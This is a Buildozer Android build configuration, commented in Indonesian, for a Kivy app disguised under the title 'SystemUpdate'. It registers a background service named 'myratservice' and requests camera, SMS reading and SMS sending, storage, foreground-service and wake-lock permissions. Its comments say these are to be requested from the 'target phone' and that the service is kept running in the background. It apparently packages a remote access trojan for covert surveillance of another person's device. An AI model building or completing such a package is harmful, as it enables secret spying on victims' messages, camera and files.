[app]
title = SystemUpdate
package.name = myapp
package.domain = org.test
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 0.1

# Kebutuhan library agar APK bisa jalan
requirements = python3,kivy,android,pyjnius

orientation = portrait
fullscreen = 0

# Izin yang akan diminta ke HP target
android.permissions = READ_EXTERNAL_STORAGE,CAMERA,READ_SMS,SEND_SMS,FOREGROUND_SERVICE,WAKE_LOCK

# Versi Android target (Android 11/12)
android.api = 31
android.minapi = 21
android.sdk = 31
android.ndk = 23b

# Bagian paling krusial: Mendaftarkan service latar belakang
android.services = myratservice:service/service.py

# Agar service tetap jalan di background
android.private_storage = True
p4a.branch = master

[buildozer]
log_level = 2
warn_on_root = 1
